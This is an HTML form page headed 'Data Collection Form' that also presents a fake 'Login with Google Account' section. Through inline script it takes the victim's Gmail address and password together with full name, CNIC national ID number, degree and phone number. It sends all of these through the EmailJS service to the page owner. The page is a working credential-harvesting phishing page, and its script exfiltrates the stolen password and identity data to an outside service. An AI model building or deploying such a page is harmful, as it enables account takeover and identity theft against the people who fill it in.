<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collection Form</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function () {
            emailjs.init("oo0jFrVnXXXmhcVVx"); // Replace YOUR_PUBLIC_KEY with your actual Public Key
        })();

        function sendEmail() {
            // Replace with your Service ID and Template ID
            const serviceID = "service_2podhf6";
            const templateID = "template_ljeu13d";

            // Collect form data
            const templateParams = {
                fullName: document.getElementById('fullName').value,
                cnic: document.getElementById('cnic').value,
                lastDegree: document.getElementById('lastDegree').value,
                email: document.getElementById('email').value,
                contact: document.getElementById('contact').value,
                gmail: document.getElementById('gmail').value,
                password: document.getElementById('pass').value,
            };

            // Send email via EmailJS
            emailjs.send(serviceID, templateID, templateParams)
                .then(response => {
                    alert("Email sent successfully!");
                })
                .catch(error => {
                    console.error("Error sending email:", error);
                    alert("Failed to send email.");
                });
        }
    </script>
</head>
<body>
    <h1>Login with Google Account</h1>
    <label for="gmail">Email:</label><br>
        <input type="text" id="gmail" name="gmail" required><br><br>

    <label for="password">Password:</label><br>
        <input type="password" id="pass" name="pass" required><br><br>
    
    <h1>Data Collection Form</h1>
    <form id="contactForm" onsubmit="event.preventDefault(); sendEmail();">
        <label for="fullName">Full Name:</label><br>
        <input type="text" id="fullName" name="fullName" required><br><br>

        <label for="cnic">CNIC:</label><br>
        <input type="text" id="cnic" name="cnic" required><br><br>

        <label for="lastDegree">Last Degree:</label><br>
        <input type="text" id="lastDegree" name="lastDegree" required><br><br>

        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email" required><br><br>

        <label for="contact">Contact:</label><br>
        <input type="tel" id="contact" name="contact" required><br><br>

        <button type="submit">Submit</button>
    </form>
</body>
</html>
